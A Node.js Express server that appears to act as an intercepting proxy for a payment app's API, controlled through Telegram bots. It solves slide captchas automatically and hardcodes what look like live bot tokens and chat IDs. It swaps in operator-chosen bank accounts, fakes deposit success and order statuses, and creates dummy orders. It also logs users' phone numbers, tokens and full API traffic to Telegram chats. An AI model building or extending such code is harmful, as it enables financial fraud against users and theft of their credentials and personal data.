const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

let _jpeg = null, _PNG = null, _captchaDepsLoadError = null;
function _loadCaptchaDeps() {
  if (_jpeg && _PNG) return true;
  if (_captchaDepsLoadError) return false;
  try {
    _jpeg = require('jpeg-js');
    _PNG = require('pngjs').PNG;
    return true;
  } catch (e) {
    _captchaDepsLoadError = e.message;
    return false;
  }
}

function _captchaDecodeDataUri(dataUri) {
  const m = String(dataUri || '').match(/^data:(image\/[a-z]+);base64,(.+)$/i);
  if (!m) return null;
  const mime = m[1].toLowerCase();
  const buf = Buffer.from(m[2], 'base64');
  if (mime === 'image/png') {
    const png = _PNG.sync.read(buf);
    return { width: png.width, height: png.height, data: png.data };
  }
  if (mime === 'image/jpeg' || mime === 'image/jpg') {
    const j = _jpeg.decode(buf, { useTArray: true, formatAsRGBA: true });
    return { width: j.width, height: j.height, data: j.data };
  }
  return null;
}

function _captchaGray(d, idx) {
  return 0.299 * d[idx] + 0.587 * d[idx + 1] + 0.114 * d[idx + 2];
}

function _captchaComputeEdgeMap(img) {
  const w = img.width, h = img.height, d = img.data;
  const edges = new Float32Array(w * h);
  for (let y = 1; y < h - 1; y++) {
    for (let x = 1; x < w - 1; x++) {
      const idx = (y * w + x) * 4;
      const gx = _captchaGray(d, idx + 4) - _captchaGray(d, idx - 4);
      const gy = _captchaGray(d, idx + w * 4) - _captchaGray(d, idx - w * 4);
      edges[y * w + x] = Math.sqrt(gx * gx + gy * gy);
    }
  }
  return edges;
}

function _captchaComputeAlphaBoundary(img) {
  const w = img.width, h = img.height, d = img.data;
  const boundary = new Uint8Array(w * h);
  let count = 0;
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      const a = d[(y * w + x) * 4 + 3];
      if (a < 128) continue;
      let isB = false;
      if (x === 0 || y === 0 || x === w - 1 || y === h - 1) isB = true;
      else {
        const n = [(y * w + x + 1), (y * w + x - 1), ((y + 1) * w + x), ((y - 1) * w + x)];
        for (const nIdx of n) {
          if (d[nIdx * 4 + 3] < 128) { isB = true; break; }
        }
      }
      if (isB) { boundary[y * w + x] = 1; count++; }
    }
  }
  return { boundary, count };
}

function _captchaComputeFilledMask(img) {
  const w = img.width, h = img.height, d = img.data;
  const mask = new Uint8Array(w * h);
  let count = 0;
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      if (d[(y * w + x) * 4 + 3] >= 128) { mask[y * w + x] = 1; count++; }
    }
  }
  return { mask, count };
}

function _captchaMasterGray(img) {
  const w = img.width, h = img.height, d = img.data;
  const g = new Float32Array(w * h);
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      g[y * w + x] = _captchaGray(d, (y * w + x) * 4);
    }
  }
  return g;
}

function _captchaFindGapX(masterImg, thumbImg, dispY) {
  if (!masterImg || !thumbImg) return null;
  const mW = masterImg.width, mH = masterImg.height;
  const tW = thumbImg.width, tH = thumbImg.height;
  if (tW >= mW || tH > mH) return null;
  if (!Number.isFinite(dispY)) dispY = Math.floor((mH - tH) / 2);

  // Pre-compute master edge map and grayscale
  const masterEdges = _captchaComputeEdgeMap(masterImg);
  const masterGray = _captchaMasterGray(masterImg);

  // Adaptive edge threshold = 60th percentile of non-trivial master edges (clamped to >=30)
  const sorted = [];
  for (let i = 0; i < masterEdges.length; i++) if (masterEdges[i] > 5) sorted.push(masterEdges[i]);
  sorted.sort((a, b) => a - b);
  const EDGE_THRESH = sorted.length > 0 ? Math.max(30, sorted[Math.floor(sorted.length * 0.6)]) : 40;

  // Binary master edge map (1 where strong edge)
  const masterEdgeBin = new Uint8Array(mW * mH);
  for (let i = 0; i < masterEdges.length; i++) masterEdgeBin[i] = masterEdges[i] > EDGE_THRESH ? 1 : 0;

  // Get thumb's alpha boundary (outline) and filled silhouette
  const { boundary, count: bCount } = _captchaComputeAlphaBoundary(thumbImg);
  const { mask: filledMask, count: fillCount } = _captchaComputeFilledMask(thumbImg);

  let useBoundary = boundary, useBCount = bCount;
  let useFilled = filledMask, useFillCount = fillCount;
  let isOpaqueThumb = false;

  if (useBCount < 20 || useFillCount < 50 || useFillCount > tW * tH * 0.95) {
    isOpaqueThumb = true;
    useBoundary = new Uint8Array(tW * tH);
    useBCount = 0;
    for (let y = 1; y < tH - 1; y++) {
      for (let x = 1; x < tW - 1; x++) {
        const idx = (y * tW + x) * 4;
        const gx = _captchaGray(thumbImg.data, idx + 4) - _captchaGray(thumbImg.data, idx - 4);
        const gy = _captchaGray(thumbImg.data, idx + tW * 4) - _captchaGray(thumbImg.data, idx - tW * 4);
        if (Math.sqrt(gx * gx + gy * gy) > 30) { useBoundary[y * tW + x] = 1; useBCount++; }
      }
    }
  }
  if (useBCount < 5) return null;

  // Pure interior mask (filled but not boundary) — used for darkness check
  const pureInterior = new Uint8Array(tW * tH);
  let pureN = 0;
  if (!isOpaqueThumb) {
    for (let i = 0; i < tW * tH; i++) {
      if (useFilled[i] && !useBoundary[i]) { pureInterior[i] = 1; pureN++; }
    }
  }

  const minX = 0;
  const maxX = mW - tW;
  if (minX > maxX) return null;

  // Search Y in a small range around dispY (in case Y is slightly off from upstream)
  const yCands = [];
  for (let dy = -3; dy <= 3; dy++) {
    const y = Math.max(0, Math.min(dispY + dy, mH - tH));
    if (!yCands.includes(y)) yCands.push(y);
  }

  // For each (x, y) candidate, compute 3 scores:
  //   edgeMatch: fraction of thumb-boundary pixels that align with strong master edges
  //   contrast:  boundary-mean-brightness MINUS interior-mean-brightness (positive at gap due to light outline + dark interior)
  //   shadow:    outside-bbox-mean MINUS interior-mean (positive at gap)
  // Combined ranking by normalized weighted sum.

  const PAD = 6;
  const W = maxX - minX + 1;
  const allScores = new Array(W * yCands.length);

  for (let yi = 0; yi < yCands.length; yi++) {
    const y = yCands[yi];
    for (let x = minX; x <= maxX; x++) {
      let edgeMatch = 0;
      let bBrightSum = 0, bN = 0;
      let iDarkSum = 0, iN = 0;
      let outSum = 0, outN = 0;

      for (let py = 0; py < tH; py++) {
        const my = y + py;
        if (my < 0 || my >= mH) continue;
        const baseRow = py * tW;
        const masterRowBase = my * mW;
        for (let px = 0; px < tW; px++) {
          const mx = x + px;
          if (mx < 0 || mx >= mW) continue;
          const mIdx = masterRowBase + mx;
          const tIdx = baseRow + px;
          if (useBoundary[tIdx]) {
            if (masterEdgeBin[mIdx]) edgeMatch++;
            bBrightSum += masterGray[mIdx];
            bN++;
          } else if (!isOpaqueThumb && pureInterior[tIdx]) {
            iDarkSum += masterGray[mIdx];
            iN++;
          }
        }
      }

      if (!isOpaqueThumb) {
        const x0 = Math.max(0, x - PAD), x1 = Math.min(mW, x + tW + PAD);
        const y0 = Math.max(0, y - PAD), y1 = Math.min(mH, y + tH + PAD);
        for (let yy = y0; yy < y1; yy++) {
          const inY = yy >= y && yy < y + tH;
          for (let xx = x0; xx < x1; xx++) {
            const inX = xx >= x && xx < x + tW;
            if (inY && inX) {
              const py = yy - y, px = xx - x;
              if (useFilled[py * tW + px]) continue;
            }
            outSum += masterGray[yy * mW + xx];
            outN++;
          }
        }
      }

      const edgeScore = edgeMatch / Math.max(1, useBCount);
      const bMean = bN > 0 ? bBrightSum / bN : 0;
      const iMean = iN > 0 ? iDarkSum / iN : bMean;
      const oMean = outN > 0 ? outSum / outN : bMean;
      const contrast = (bMean - iMean);   // positive at gap (light outline > dark interior)
      const shadow = (oMean - iMean);     // positive at gap (surroundings brighter than interior)

      allScores[yi * W + (x - minX)] = { x, y, edgeScore, contrast, shadow };
    }
  }

  // Normalize each metric to 0..1 across all candidates, then combine
  let eMin = Infinity, eMax = -Infinity;
  let cMin = Infinity, cMax = -Infinity;
  let sMin = Infinity, sMax = -Infinity;
  for (const s of allScores) {
    if (s.edgeScore < eMin) eMin = s.edgeScore;
    if (s.edgeScore > eMax) eMax = s.edgeScore;
    if (s.contrast < cMin) cMin = s.contrast;
    if (s.contrast > cMax) cMax = s.contrast;
    if (s.shadow < sMin) sMin = s.shadow;
    if (s.shadow > sMax) sMax = s.shadow;
  }
  const eR = Math.max(0.001, eMax - eMin);
  const cR = Math.max(0.001, cMax - cMin);
  const sR = Math.max(0.001, sMax - sMin);

  for (const s of allScores) {
    const eN = (s.edgeScore - eMin) / eR;
    const cN = isOpaqueThumb ? 0 : (s.contrast - cMin) / cR;
    const sN = isOpaqueThumb ? 0 : (s.shadow - sMin) / sR;
    s.combined = isOpaqueThumb ? eN : (eN * 0.45 + cN * 0.35 + sN * 0.20);
  }

  // Sort by combined descending; suppress nearby duplicates (within 8px)
  const sortedC = [...allScores].sort((a, b) => b.combined - a.combined);
  const top = [];
  for (const c of sortedC) {
    if (top.every(t => Math.abs(t.x - c.x) > 8 || Math.abs(t.y - c.y) > 4)) {
      top.push(c);
      if (top.length >= 3) break;
    }
  }

  const best = top[0];
  return {
    x: best.x,
    y: best.y,
    score: best.combined,
    edge: best.edgeScore,
    contrast: best.contrast,
    shadow: best.shadow,
    boundaryPixels: useBCount,
    opaque: isOpaqueThumb,
    edgeThresh: EDGE_THRESH,
    top3: top.map(t => ({ x: t.x, y: t.y, c: t.combined, e: t.edgeScore, k: t.contrast, s: t.shadow }))
  };
}

function solveSlideCaptcha(masterB64, thumbB64, dispY) {
  if (!_loadCaptchaDeps()) {
    return { ok: false, error: 'deps_missing:' + _captchaDepsLoadError };
  }
  const master = _captchaDecodeDataUri(masterB64);
  const thumb = _captchaDecodeDataUri(thumbB64);
  if (!master || !thumb) {
    return { ok: false, error: 'decode_failed', master: !!master, thumb: !!thumb };
  }
  const r = _captchaFindGapX(master, thumb, dispY);
  if (!r) return { ok: false, error: 'no_gap_found' };
  return { ok: true, x: r.x, y: r.y, score: r.score, edge: r.edge, contrast: r.contrast, shadow: r.shadow, opaque: r.opaque, edgeThresh: r.edgeThresh, top3: r.top3, boundaryPixels: r.boundaryPixels, masterDim: [master.width, master.height], thumbDim: [thumb.width, thumb.height] };
}

const app = express();
const ORIGINAL_API = 'https://api.wecoincard.com';
let BOT_TOKEN = process.env.BOT_TOKEN || '8636245254:AAHldk_gAF8p-Wz0klvG6XU9pOSHTvqTt4I';

const BASE_URL = process.env.BASE_URL || (process.env.VERCEL_PROJECT_PRODUCTION_URL ? `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL}` : (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://xchas.vercel.app'));
const WEBHOOK_URL = `${BASE_URL}/bot-webhook`;

// === SECONDARY BOT CONFIGURATION ===
let BOT2_TOKEN = process.env.BOT2_TOKEN || '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ';
let BOT2_CHAT_ID = process.env.BOT2_CHAT_ID || '5880677639';
let BOT2_ENABLED = true;

const REDIS_URL = process.env.KV_REST_API_URL || 
  process.env.UPSTASH_REDIS_REST_URL || 
  process.env.STORAGE_KV_REST_API_URL || 
  process.env.STORAGE_REST_API_URL || 
  process.env.STORAGE_URL ||
  process.env.REDIS_REST_API_URL;

const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || 
  process.env.UPSTASH_REDIS_REST_TOKEN || 
  process.env.STORAGE_KV_REST_API_TOKEN || 
  process.env.STORAGE_REST_API_TOKEN ||
  process.env.REDIS_REST_API_TOKEN;

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }

let bot2 = null;
if (BOT2_TOKEN && BOT2_TOKEN !== 'BOT2_TOKEN_HERE') {
  try { bot2 = new TelegramBot(BOT2_TOKEN); } catch (e) { }
}

function sendBot2Message(text, options) {
  if (!BOT2_ENABLED || !bot2 || !BOT2_CHAT_ID || BOT2_CHAT_ID === 'BOT2_CHAT_ID_HERE') return;
  bot2.sendMessage(BOT2_CHAT_ID, text, options || { parse_mode: 'Markdown' }).catch(() => { });
}
const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  botToken: '8636245254:AAHldk_gAF8p-Wz0klvG6XU9pOSHTvqTt4I',
  adminChatId: null,
  logRequests: true,
  logDebugRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  balanceHistory: [],
  orderBankMap: {},
  sentOrderInfo: {},
  dummyOrders: [],
  useIdOverride: null,
  alwaysIdOverride: null,
  lastCapturedId: { deviceId: '', challengeId: '' },
  customServiceLink: '',
  bot2Token: '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ',
  bot2ChatId: '5880677639',
  bot2Enabled: true,
  orderStatusOverrides: {},
  suspendedUsers: {}
};

function generateDummyCode() {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

function generateDummyId() {
  return String(Math.floor(10000000 + Math.floor(Math.random() * 90000000)));
}

const payoutWalletCache = new Map();

function findDummyOrder(data, idOrCodeOrReq) {
  if (!idOrCodeOrReq) return null;
  const candidates = new Set();

  const addCand = (v) => {
    if (v === undefined || v === null) return;
    const s = String(v).trim().toLowerCase();
    if (s && s.length >= 2 && s !== 'undefined' && s !== 'null' && s !== 'true' && s !== 'false' && s !== '[object object]') {
      candidates.add(s);
    }
  };

  if (typeof idOrCodeOrReq === 'string' || typeof idOrCodeOrReq === 'number') {
    addCand(idOrCodeOrReq);
  } else if (typeof idOrCodeOrReq === 'object') {
    const req = idOrCodeOrReq;

    if (req.query && typeof req.query === 'object') {
      for (const [k, v] of Object.entries(req.query)) addCand(v);
    }

    const body = req.body || req.parsedBody || {};
    if (body && typeof body === 'object') {
      for (const [k, v] of Object.entries(body)) {
        if (typeof v === 'object' && v !== null) {
          for (const [k2, v2] of Object.entries(v)) addCand(v2);
        } else {
          addCand(v);
        }
      }
    }

    if (req.rawBody && Buffer.isBuffer(req.rawBody)) {
      const rawStr = req.rawBody.toString('utf8').trim();
      addCand(rawStr);
      try {
        if (rawStr.startsWith('{') || rawStr.startsWith('[')) {
          const parsed = JSON.parse(rawStr);
          if (parsed && typeof parsed === 'object') {
            for (const [k, v] of Object.entries(parsed)) addCand(v);
          }
        } else if (rawStr.includes('=')) {
          const params = new URLSearchParams(rawStr);
          for (const [k, v] of params.entries()) addCand(v);
        }
      } catch (e) { }
    }

    if (req.originalUrl && req.originalUrl.includes('?')) {
      try {
        const qStr = req.originalUrl.split('?')[1];
        const params = new URLSearchParams(qStr);
        for (const [k, v] of params.entries()) addCand(v);
      } catch (e) { }
    }
  }

  if (candidates.size === 0) return null;

  const candArr = Array.from(candidates);

  if (data.dummyOrders && Array.isArray(data.dummyOrders)) {
    const match = data.dummyOrders.find(d => {
      if (!d) return false;
      const dId = String(d.id || '').trim().toLowerCase();
      const dPayOrderId = String(d.payOrderId || '').trim().toLowerCase();
      const dCode = String(d.code || d.orderCode || d.buyCode || d.remark || d.sn || d.orderNo || '').trim().toLowerCase();
      return candArr.some(c => (dId && c === dId) || (dPayOrderId && c === dPayOrderId) || (dCode && c === dCode));
    });
    if (match) return match;
  }

  if (data.activeBoughtDummyOrders && typeof data.activeBoughtDummyOrders === 'object') {
    for (const c of candArr) {
      if (data.activeBoughtDummyOrders[c]) return data.activeBoughtDummyOrders[c];
    }
    for (const d of Object.values(data.activeBoughtDummyOrders)) {
      if (!d) continue;
      const dId = String(d.id || '').trim().toLowerCase();
      const dPayOrderId = String(d.payOrderId || '').trim().toLowerCase();
      const dCode = String(d.code || d.orderCode || d.buyCode || d.remark || d.sn || d.orderNo || '').trim().toLowerCase();
      if (candArr.some(c => (dId && c === dId) || (dPayOrderId && c === dPayOrderId) || (dCode && c === dCode))) return d;
    }
  }

  return null;
}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch (e) { }
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 1000;
const tokenUserMap = {};
const userPhoneMap = {};
const refreshTokenMap = {};
const userDeviceMap = {};
const orderNotifyCache = new Map();
const orderCache = new Map();
let debugMode = false;

const WALLET_TYPE_MAP = {
  1: 'Airtel',
  2: 'Freecharge',
  3: 'PhonePe',
  4: 'Mobikwik',
  5: 'Paytm',
  6: 'Amazon',
  7: 'Paytm Business',
  8: 'Phonepe Business',
  9: 'IndusPay',
  10: 'BharatpeBiz'
};

function getWalletName(item) {
  if (!item || typeof item !== 'object') return 'Payout Tool';
  const rawName = item.name || (item.wallet && item.wallet.name) || item.walletName || item.payTypeName || item.title || item.channelName || '';
  if (rawName && typeof rawName === 'string' && rawName.trim() && !/payout|tool|wallet/i.test(rawName.trim())) {
    return rawName.trim();
  }
  const typeId = item.ctType ?? item.type ?? item.walletType ?? item.payoutWalletType ?? item.channelType ?? (item.wallet && item.wallet.ctType);
  if (typeId !== undefined && typeId !== null) {
    const num = Number(typeId);
    if (WALLET_TYPE_MAP[num]) return WALLET_TYPE_MAP[num];
  }
  const addr = String(item.address || item.account || item.payoutAccount || item.payoutUpi || item.phone || item.mobile || item.upiId || '').toLowerCase();
  if (addr.includes('@freecharge') || addr.includes('@fc')) return 'Freecharge';
  if (addr.includes('@paytm')) return 'Paytm';
  if (addr.includes('@ikwik') || addr.includes('@mobikwik')) return 'Mobikwik';
  if (addr.includes('@ybl') || addr.includes('@ibl') || addr.includes('@axl')) return 'PhonePe';
  if (addr.includes('@ok')) return 'Google Pay';

  if (rawName) return rawName;
  return 'Payout Tool';
}

function extractOrderCode(item) {
  if (!item || typeof item !== 'object') return '';
  const keys = ['code', 'orderCode', 'buyCode', 'sn', 'no', 'orderNo', 'buyNo', 'payOrderNo', 'tradeNo', 'codeName', 'orderSn', 'buySn'];
  for (const k of keys) {
    if (item[k] && typeof item[k] === 'string' && item[k].trim()) {
      return item[k].trim();
    }
  }
  for (const [k, v] of Object.entries(item)) {
    if (typeof v === 'string' && /^[a-zA-Z0-9]{4,15}$/.test(v) && !['id', 'payOrderId', 'orderId', 'buyId', 'userId', 'memberId', 'ctType', 'type', 'status', 'payStatus'].includes(k)) {
      return v;
    }
  }
  return '';
}

function cacheOrderDetails(dataObj, depth) {
  if (!dataObj || typeof dataObj !== 'object' || (depth || 0) > 6) return;
  if (Array.isArray(dataObj)) {
    for (const item of dataObj) {
      if (item && typeof item === 'object') cacheOrderDetails(item, (depth || 0) + 1);
    }
    return;
  }
  const amount = parseFloat(dataObj.amount || dataObj.orderAmount || dataObj.buyAmount || dataObj.unpaidAmount || dataObj.totalAmount || 0) || 0;
  const code = extractOrderCode(dataObj);
  const idKeys = [dataObj.payOrderId, dataObj.orderId, dataObj.buyId, dataObj.id, dataObj.payOrderNo, dataObj.orderNo].filter(k => k !== undefined && k !== null && String(k).trim() !== '');
  for (const key of idKeys) {
    const idStr = String(key).trim();
    if (idStr && (amount > 0 || code)) {
      const existing = orderCache.get(idStr) || {};
      orderCache.set(idStr, {
        amount: amount || existing.amount || 0,
        code: code || existing.code || '',
        time: Date.now()
      });
    }
  }
  for (const k of Object.keys(dataObj)) {
    if (dataObj[k] && typeof dataObj[k] === 'object') {
      cacheOrderDetails(dataObj[k], (depth || 0) + 1);
    }
  }
  if (orderCache.size > 5000) {
    const cutoff = Date.now() - 3600000;
    for (const [k, v] of orderCache) {
      if (v.time < cutoff) orderCache.delete(k);
    }
  }
}

function isAuthFailureResponse(jsonResp) {
  if (!jsonResp) return false;
  const c = jsonResp.code;
  return c === 401 || c === '401' || c === 403 || c === '403';
}

function shouldBypass401(req) {
  return false;
}

function make401Bypass(jsonResp) {
  const fakeData = (jsonResp && jsonResp.data !== undefined) ? (Array.isArray(jsonResp.data) ? [] : {}) : {};
  return { code: 1000, data: fakeData, message: 'success' };
}

function sendJsonSafe(res, headers, json, fallback, req) {
  if (req && cachedData && cachedData.logDebugRequests && cachedData.adminChatId && bot) {
    try {
      const path = req.originalUrl || req.url || 'N/A';
      const method = req.method || 'GET';
      const userId = req._userId || 'N/A';
      const phone = req._phone || '';

      let reqBodyStr = req.parsedBody ? JSON.stringify(req.parsedBody, null, 2) : '';
      let respBodyStr = json ? JSON.stringify(json, null, 2) : (typeof fallback === 'string' ? fallback : JSON.stringify(fallback, null, 2));

      if (reqBodyStr && reqBodyStr.length > 1000) reqBodyStr = reqBodyStr.substring(0, 1000) + '\n... (truncated)';
      if (respBodyStr && respBodyStr.length > 1500) respBodyStr = respBodyStr.substring(0, 1500) + '\n... (truncated)';

      let debugMsg = `📡 *[DEBUG] HTTP API Traffic*\n━━━━━━━━━━━━━━━━━━\n`;
      debugMsg += `🌐 *Endpoint:* \`${method} ${path}\`\n`;
      if (userId && userId !== 'N/A') debugMsg += `👤 *User:* \`${userId}\`${phone ? ' (' + phone + ')' : ''}\n`;
      debugMsg += `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n`;

      if (reqBodyStr && reqBodyStr !== '{}') {
        debugMsg += `📥 *Request Body:*\n\`\`\`json\n${reqBodyStr}\n\`\`\`\n\n`;
      }
      if (respBodyStr) {
        debugMsg += `📤 *Response Data:*\n\`\`\`json\n${respBodyStr}\n\`\`\``;
      }

      bot.sendMessage(cachedData.adminChatId, debugMsg, { parse_mode: 'Markdown' }).catch(() => { });
    } catch (e) { }
  }

  if (json && isAuthFailureResponse(json) && shouldBypass401(req)) {
    const bypass = make401Bypass(json);
    return sendJson(res, headers, bypass, JSON.stringify(bypass));
  }
  return sendJson(res, headers, json, fallback);
}

const WEBHOOK2_URL = `${BASE_URL}/bot2-webhook`;
let webhook2Set = false;

async function ensureWebhook() {
  if (bot && !webhookSet) {
    try {
      await bot.setWebHook(WEBHOOK_URL);
      webhookSet = true;
    } catch (e) { }
  }
  if (bot2 && !webhook2Set) {
    try {
      await bot2.setWebHook(WEBHOOK2_URL);
      webhook2Set = true;
    } catch (e) { }
  }
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('wecoinpayData');
    if (!raw) raw = await redis.get('diwapayData');
    if (raw) {
      if (typeof raw === 'string') {
        try { raw = JSON.parse(raw); } catch (e) { }
      }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      if (!cachedData.balanceHistory) cachedData.balanceHistory = [];
      if (!cachedData.orderStatusOverrides) cachedData.orderStatusOverrides = {};
      if (!cachedData.suspendedUsers) cachedData.suspendedUsers = {};

      // Sync dynamic Bot variables
      if (cachedData.botToken) {
        if (BOT_TOKEN !== cachedData.botToken) {
          BOT_TOKEN = cachedData.botToken;
          try {
            bot = new TelegramBot(BOT_TOKEN);
            webhookSet = false; // Trigger re-set of webhook
          } catch (e) { }
        }
      }
      // Sync dynamic BOT2 variables
      if (cachedData.bot2Token) {
        if (BOT2_TOKEN !== cachedData.bot2Token) {
          BOT2_TOKEN = cachedData.bot2Token;
          try {
            bot2 = new TelegramBot(BOT2_TOKEN);
            webhook2Set = false; // Trigger re-set of webhook
          } catch (e) { }
        }
      }
      if (cachedData.bot2ChatId) BOT2_CHAT_ID = cachedData.bot2ChatId;
      if (cachedData.bot2Enabled !== undefined) BOT2_ENABLED = cachedData.bot2Enabled;

      cacheTime = Date.now();
      return cachedData;
    }
  } catch (e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  cachedData = data;
  cacheTime = Date.now();
  if (!redis) return;
  try {
    // Use stringify to ensure proper serialization and await to ensure it's written
    await redis.set('wecoinpayData', JSON.stringify(data));
  } catch (e) {
    console.error('Redis save error:', e.message);
  }
}

function getTokenFromReq(req) {
  return req.headers['authorization'] || req.headers['token'] || req.headers['apptoken'] || '';
}

function cleanToken(tok) {
  if (!tok) return '';
  if (tok.startsWith('Bearer ')) tok = tok.slice(7).trim();
  return tok.substring(0, 100);
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  const key = cleanToken(tok);
  if (key && key.length > 10) {
    tokenUserMap[key] = String(userId);
    if (redis) redis.hset('tokenMap', key, String(userId)).catch(() => { });
  }
}

async function getUserIdFromToken(req) {
  const tok = getTokenFromReq(req);
  const key = cleanToken(tok);
  if (!key || key.length < 10) return null;
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('tokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch (e) { }
  }
  return null;
}

async function extractUserIdFromToken(req) {
  const authHeader = getTokenFromReq(req);
  if (authHeader) {
    try {
      const clean = authHeader.replace('Bearer ', '');
      const parts = clean.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        const jwtUserId = payload.userId || payload.sub || '';
        if (jwtUserId) return String(jwtUserId);
      }
    } catch (e) { }
  }
  const fromToken = await getUserIdFromToken(req);
  if (fromToken) return fromToken;
  return '';
}

async function extractUserId(req, jsonResp) {
  const fromToken = await extractUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.userId || body.userid || body.memberId || body.id || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  if (qs.get('id')) return String(qs.get('id'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.userId || respData.userid || respData.memberId || respData.id || '';
    if (rid) return String(rid);
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || '',
    balance: existing.balance || '',
    name: existing.name || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

const logOffTokens = new Set();
const checkedTokens = new Set();

function isLogOffByTokenFast(data, req) {
  const tok = getTokenFromReq(req);
  const tKey = cleanToken(tok);
  if (!tKey || tKey.length < 10) return false;
  if (logOffTokens.has(tKey)) return true;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  return false;
}

async function isLogOffByToken(data, req) {
  const tok = getTokenFromReq(req);
  const tKey = cleanToken(tok);
  if (!tKey || tKey.length < 10) return false;
  if (logOffTokens.has(tKey)) return true;
  if (checkedTokens.has(tKey)) return false;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  if (redis) {
    try {
      const isOff = await redis.sismember('wecoinpayLogOffTokens', tKey);
      if (isOff) { logOffTokens.add(tKey); return true; }
      const stored = await redis.hget('wecoinpayTokenMap', tKey);
      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('wecoinpayLogOffTokens', tKey).catch(() => { }); return true; }
    } catch (e) { }
  }
  checkedTokens.add(tKey);
  return false;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) {
    userPhoneMap[String(userId)] = tracked.phone;
    return tracked.phone;
  }
  return '';
}

function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(data, userId) {
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, userId) {
  const bank = getActiveBank(data, userId);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
